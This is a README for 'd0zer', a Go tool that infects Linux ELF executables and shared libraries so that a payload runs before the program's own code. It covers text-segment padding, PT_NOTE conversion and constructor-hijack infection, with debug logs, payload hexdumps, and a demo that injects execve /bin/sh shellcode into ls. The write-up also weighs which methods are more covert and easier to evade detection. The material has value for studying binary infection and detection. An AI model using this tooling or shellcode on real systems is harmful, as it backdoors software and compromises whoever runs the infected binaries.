# d0zer
Elf binary infector written in Go. It can be used for infecting executables of type ET_DYN and ET_EXEC with a payload of your creation. Utilizing the classic elf text segment padding algorithm by Silvio Cesar, your payload (parasite) will run before native functionality of the binary effectively backooring the binary.

d0zer currently allows for up to a page size payload (4096 bytes). It is capable of infecting both x86_32 and x86_64  elf executable binaries executables.

# Motivation
My motivations are quite simple, I like doing interesting things with the ELFs and binary infection of a target requires a decent amount of overhead knowledge and skill as a prerequisite to perform it (TO ME), so I set out to learn from papers, books and specs from the past (see references), throwed Golang in the middle for increased difficulty and here I am.

# build

<pre> 
[sad0p@arch-deliberate d0zer]$ go version
go version go1.21.2 linux/amd64
[sad0p@arch-deliberate d0zer]$ go build
</pre>

# Usage
<pre>
[sad0p@arch-deliberate d0zer]$ ./d0zer -help
  -ctorsHijack
    	Hijack the first constructor in the target to start parasitic execution intead of modifying the OEP
  -debug
    	see debug output (generated payload, modifications, etc)
  -help
    	see this help menu
  -infectionAlgo string
    	specify infection algorithm to use (default "TextSegmentPadding")
  -listAlgos
    	list available infection algorithms
  -noPreserve
    	prevents d0zer from prepending its register preservation routine to your payload
  -noRestoration
    	prevents d0zer from appending register restoration routine to your payload
  -noRetOEP
    	prevents d0zer from appending ret-to-OEP (continue execution after payload) to payload
  -payloadBin string
    	path to binary containing payload
  -payloadEnv string
    	name of the environmental variable holding the payload
  -target string
    	path to binary targeted for infection
[sad0p@arch-deliberate d0zer]$ 
</pre>
Basic demo (benign) infection can be accomplished with `./dozer -target [path-to-target]`.
<pre> 
[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls
[sad0p@Arch-Deliberate d0zer]$ experimental/ls-infected
hello -- this is a non destructive payloadd0zer	     epiloguejmp.go  jmp-to-oep32      jmp-to-oep.o		  non-destructive-payload32.asm  non-destructive-payload64.o  shellcode.c
d0zer.go     experimental    jmp-to-oep32.asm  LICENSE			  non-destructive-payload32.o	 output			      test
elf64	     genpayload.go   jmp-to-oep32.o    non-destructive-payload	  non-destructive-payload64	 README.md		      test.go
epiloguejmp  jmp-to-oep      jmp-to-oep.asm    non-destructive-payload32  non-destructive-payload64.asm  shellcode
[sad0p@Arch-Deliberate d0zer]$ 
</pre>

Supplying `-debug` allows you to see each step of the infection algorithm at work aswell as a hexdump of the payload as it will be in the binary. 

<pre>
[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls -debug
[+] Modified entry point from 0x5b20 -> 0x173d1
[+] Text segment starts @ 0x4000
[+] Text segment ends @ 0x173d1
[+] Payload size pre-epilogue 0x5c
[+] Payload size post-epilogue 0x90
------------------PAYLOAD----------------------------
00000000  50 51 53 52 56 57 55 54  41 50 41 51 41 52 41 53  |PQSRVWUTAPAQARAS|
00000010  41 54 41 55 41 56 41 57  eb 00 e8 2b 00 00 00 68  |ATAUAVAW...+...h|
00000020  65 6c 6c 6f 20 2d 2d 20  74 68 69 73 20 69 73 20  |ello -- this is |
00000030  61 20 6e 6f 6e 20 64 65  73 74 72 75 63 74 69 76  |a non destructiv|
00000040  65 20 70 61 79 6c 6f 61  64 0a b8 01 00 00 00 bf  |e payload.......|
00000050  01 00 00 00 5e ba 2a 00  00 00 0f 05 41 5f 41 5e  |....^.*.....A_A^|
00000060  41 5d 41 5c 41 5b 41 5a  41 59 41 58 5c 5d 5f 5e  |A]A\A[AZAYAX\]_^|
00000070  5a 5b 59 58 e8 12 00 00  00 48 83 e8 79 48 2d d1  |Z[YX.....H..yH-.|
00000080  73 01 00 48 05 20 5b 00  00 ff e0 48 8b 04 24 c3  |s..H. [....H..$.|
--------------------END------------------------------
[+] Generated and appended position independent return 2 OEP stub to payload
[+] Increased text segment p_filesz and p_memsz by 144 (length of payload)
[+] Adjusting segments after text segment file offsets by 0x1000
Inceasing pHeader @ index 4 by 0x1000
Inceasing pHeader @ index 5 by 0x1000
Inceasing pHeader @ index 6 by 0x1000
Inceasing pHeader @ index 8 by 0x1000
Inceasing pHeader @ index 10 by 0x1000
[+] Increasing section header addresses if they come after text segment
[+] Extending section header entry for text section by payload len.
[+] (15) Updating sections past text section @ addr 0x18000
[+] (16) Updating sections past text section @ addr 0x1d324
[+] (17) Updating sections past text section @ addr 0x1dc78
[+] (18) Updating sections past text section @ addr 0x21fd0
[+] (19) Updating sections past text section @ addr 0x21fd8
[+] (20) Updating sections past text section @ addr 0x21fe0
[+] (21) Updating sections past text section @ addr 0x22a58
[+] (22) Updating sections past text section @ addr 0x22c58
[+] (23) Updating sections past text section @ addr 0x23000
[+] (24) Updating sections past text section @ addr 0x23280
[+] (25) Updating sections past text section @ addr 0x0
[+] (26) Updating sections past text section @ addr 0x0
[+] writing payload into the binary
</pre>

A custom payload can be injected into the binary with the `-payloadEnv` flag. Below I inject a basic execve /bin/sh shellcode into the ls command as an example.

<pre>
[sad0p@Arch-Deliberate d0zer]$ export DOZEREGG="\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls -payloadEnv DOZEREGG
[sad0p@Arch-Deliberate d0zer]$ experimental/ls-infected
sh-5.1$ 
</pre>

The `-payloadBin` flag is currently not implemented, it would allow you to supply a PIE (binary), where the contents of the text
segments would serve as the payload.

<pre>
[sad0p@Arch-Deliberate d0zer]$ ./d0zer -target experimental/ls -payloadBin ./non-destructive-payload64
Getting payload from an ELF binary .text segment is not yet supported
[sad0p@Arch-Deliberate d0zer]$ 
</pre>

A list of supported infection algorithms can be seen with `--listAlgos`.

<pre>
[sad0p@arch-deliberate d0zer]$ ./d0zer --listAlgos
TextSegmentPadding
	Extends the text segment and append your payload. There are max payload size considerations. Also more "stealthy" than ptnote2ptload.
PtNoteToPtLoad
	Converts the PT_NOTE segment to PT_LOAD. Payloads can be of arbitrary length, more stable than textsegmentpadding but easier to detect
[sad0p@arch-deliberate d0zer]$ 
</pre>

Infection algorithm `TextSegmentPadding` is the default algorithm of choice, however it is limited based on the size of the payload and the target. For arbitrary sized payloads, `PtNoteToPtLoad` is a better choice (however it is not as covert).

For entry point obfuscation, we can use `-ctorsHijack` option, this modifies relocations associated with `.init_array` section. The 
`.init_array` section is essentially an array of function pointers that are called during runtime to be executed before `main()` or when dynamic linking of a shared object is performed, that is we can infect shared objects and have code execution performed with the `-ctorsHijack` option, code execution will take place in the context of the binary linking the shared object.

The following is an example of using -ctorsHijack (relative relocation poisoning/hijacking) to infect a shared library using TextSegmentPadding. 
<pre>
[sad0p@arch-deliberate testlib2]$ cat compile-lib.sh 
#!/bin/bash

gcc -c -Wall -Werror -fpic foo.c;
gcc -shared -o libfoo.so foo.o;
gcc -L $PWD -Wall -o test main.c -lfoo;
export LD_LIBRARY_PATH=$PWD:$LD_LIBRARY_PATH;
/bin/bash;
[sad0p@arch-deliberate testlib2]$ cat foo.c
#include <stdio.h>
 
 
void foo(void)
{
    puts("Hello, I am a shared library");
}
[sad0p@arch-deliberate testlib2]$ cat foo.h
#ifndef foo_h__
#define foo_h__
 
extern void foo(void);
 
#endif  // foo_h__
[sad0p@arch-deliberate testlib2]$ cat main.c
#include <stdio.h>
#include "foo.h"
 
int main(void)
{
    puts("This is a shared library test...");
    foo();
    return 0;
}
[sad0p@arch-deliberate testlib2]$ cat foo.h
#ifndef foo_h__
#define foo_h__
 
extern void foo(void);
 
#endif  // foo_h__
[sad0p@arch-deliberate testlib2]$ cat foo.c
#include <stdio.h>
 
 
void foo(void)
{
    puts("Hello, I am a shared library");
}
[sad0p@arch-deliberate testlib2]$ 
[sad0p@arch-deliberate testlib2]$ ./compile-lib.sh 
[sad0p@arch-deliberate testlib2]$ ls
compile-lib.sh  foo.c  foo.h  foo.o  libfoo.so  main.c  test
[sad0p@arch-deliberate testlib2]$ ./test
This is a shared library test...
Hello, I am a shared library
[sad0p@arch-deliberate testlib2]$ ../../d0zer -target ./libfoo.so -infectionAlgo TextSegmentPadding -ctorsHijack -debug 
[+] Maximum payload size 0xed3 for ./libfoo.so
[+] CtorsHijack requested. Locating and reading Dynamic Segment
[+] 24 entries in Dynamic Segment
[+] Located DT_RELA @ 0x0000000000000478
[+] DT_RELA has 24 entries
[+] File offset of relocations @ 0x0000000000000478
[+] Found viable relocation record hooking/poisoning
	offset: 0x0000000000003df8
	type: R_X86_64_RELATIVE
	Addend: 0x0000000000001100
[+] offset 0x0000000000002df8 updated with value (Addend) 000000000000112d
[+] Text segment starts @ 0x1000
[+] Text segment ends @ 0x112d
[+] Payload size pre-epilogue 0x5c
[+] Appended default restoration stub
[+] Generated and appended position independent return 2 OEP stub to payload
[+] Payload size post-epilogue 0x90
------------------PAYLOAD----------------------------
00000000  54 50 51 53 52 56 57 55  41 50 41 51 41 52 41 53  |TPQSRVWUAPAQARAS|
00000010  41 54 41 55 41 56 41 57  eb 00 e8 2b 00 00 00 68  |ATAUAVAW...+...h|
00000020  65 6c 6c 6f 20 2d 2d 20  74 68 69 73 20 69 73 20  |ello -- this is |
00000030  61 20 6e 6f 6e 20 64 65  73 74 72 75 63 74 69 76  |a non destructiv|
00000040  65 20 70 61 79 6c 6f 61  64 0a b8 01 00 00 00 bf  |e payload.......|
00000050  01 00 00 00 5e ba 2a 00  00 00 0f 05 41 5f 41 5e  |....^.*.....A_A^|
00000060  41 5d 41 5c 41 5b 41 5a  41 59 41 58 5d 5f 5e 5a  |A]A\A[AZAYAX]_^Z|
00000070  5b 59 58 5c e8 12 00 00  00 48 83 e8 79 48 2d 2d  |[YX\.....H..yH--|
00000080  11 00 00 48 05 00 11 00  00 ff e0 48 8b 04 24 c3  |...H.......H..$.|
--------------------END------------------------------
[+] Increased text segment p_filesz and p_memsz by 144 (length of payload)
[+] Adjusting segments after text segment file offsets by 0x1000
	Inceasing pHeader @ index 2 by 0x1000
	Inceasing pHeader @ index 3 by 0x1000
	Inceasing pHeader @ index 4 by 0x1000
	Inceasing pHeader @ index 8 by 0x1000
	Inceasing pHeader @ index 10 by 0x1000
[+] Increasing section header addresses if they come after text segment
[+] Extending section header entry for text section by payload len.
[+] (14) Updating sections past text section @ addr 0x2000
[+] (15) Updating sections past text section @ addr 0x2020
[+] (16) Updating sections past text section @ addr 0x2040
[+] (17) Updating sections past text section @ addr 0x3df8
[+] (18) Updating sections past text section @ addr 0x3e00
[+] (19) Updating sections past text section @ addr 0x3e08
[+] (20) Updating sections past text section @ addr 0x3fc8
[+] (21) Updating sections past text section @ addr 0x3fe8
[+] (22) Updating sections past text section @ addr 0x4008
[+] (23) Updating sections past text section @ addr 0x4010
[+] (24) Updating sections past text section @ addr 0x0
[+] (25) Updating sections past text section @ addr 0x0
[+] (26) Updating sections past text section @ addr 0x0
[+] (27) Updating sections past text section @ addr 0x0
[+] writing payload into the binary
[sad0p@arch-deliberate testlib2]$ ls
compile-lib.sh  foo.c  foo.h  foo.o  libfoo.so  libfoo.so-infected  main.c  test
[sad0p@arch-deliberate testlib2]$ cp libfoo.so-infected libfoo.so-infected.backup
[sad0p@arch-deliberate testlib2]$ cp libfoo.so libfoo.so-clean-backup
[sad0p@arch-deliberate testlib2]$ mv libfoo.so-infected libfoo.so
[sad0p@arch-deliberate testlib2]$ ./test
hello -- this is a non destructive payloadThis is a shared library test...
Hello, I am a shared library
[sad0p@arch-deliberate testlib2]$ ls
compile-lib.sh  foo.c  foo.h  foo.o  libfoo.so  libfoo.so-clean-backup  libfoo.so-infected.backup  main.c  test
[sad0p@arch-deliberate testlib2]$ 

</pre>  

# VX-Underground Black Mass Volume 2

Shared object infection through relocation hijacking / poisoning is well documented in Black Mass Volume 2 [here.](https://samples.vx-underground.org/root/Papers/Other/VXUG%20Zines/2023-09-19%20-%20Black%20Mass%20Volume%20II.pdf)

# Advance Usage

In the event you don't like the routines d0zer add to your code the following flags can be utilized, however your payload
should handle any consequences that come comes from removing them.

The `-noPreserve` flag removes the general purpose register preservation routine. For x86_32 targets this is accomplished via a `pushad` instruction. For x86_64 targets, all general purpose registers are manually pushed onto the stack as the the `pushad` instruction in x86_64 is not valid. The overall purpose of this routine is to preserve register states after execution of your payload, when control is handed back to libc runtime routine (OEP) it expects certain register values in order to properly execute. In some contexts, I was able to simply preserve the `RDX` register and no crashes occured, in others (using shellcode I downloaded) preserving `RDX` was not enough. So in order to stay "portable", I thought it was wise to save all state as I wasn't completely sure which registers were needed currently or in the future.

The `-noRestoration` flag removes the restoration routine, which is the opposite of the preservation routine, it performs a `popa` for x86_32 targets and a manual popping of each general purpose register from the stack.

The `-noRetOEP` flag removes the "return to original entry point" routine. This stub enables portability across pie (ET_DYN) and non-pie (ET_EXEC) elf executables. The code extracts the randomized base address by capturing the current instuction pointer value in accumulator register. It then substracts the payload length from the accumulator (+ 5 bytes for the relative call instruction), then subtracts the entry point of payload. Finally it adds the offset of the binaries OEP to then perform a `jmp rax` or `jmp eax` (for x86_32) instruction to start executing native/non-parasitic code. If you intend on handling this your self then your code must handle proper exiting/continuation of the binary to avoid SIGSEGV.

All preservation, restoration and ret-2-oep shellcode are heavily commented for clarity. Restoration and preservation stubs can be found at the top of the `d0zer.go` source file. The `ret2OEP` routine can be found in `epilogue.go`.

# Payload considerations

It's worth noting that code being injected (payload/parasite) should be position independent. Additionally with in your payload anything pushed onto the stack should be popped off if you choose to use restoration and preservations stubs (which d0zer prepends & appends by default). Due to the stacks LIFO structure, should anything (except the register values pushed in the preservation stub)be on there after you've executed your payload you run the risk of getting a SIGSEGV in the libc runtime routine.

# References
<pre>
Linux Binary Analysis by Ryan Oneil (Elfmaster), see virus technology chapter.

LPV (a unix virus) written in C utilizing the same algorithm as d0zer written by Elfmaster.
https://bitlackeys.org/projects/lpv.c

Unix ELF parasites and viruses - by Silvio Cesar
https://vx-underground.org/archive/VxHeaven/lib/vsc01.html

Return To Original Entry Point Despite PIE - by s0lden
https://tmpout.sh/1/11.html
</pre>

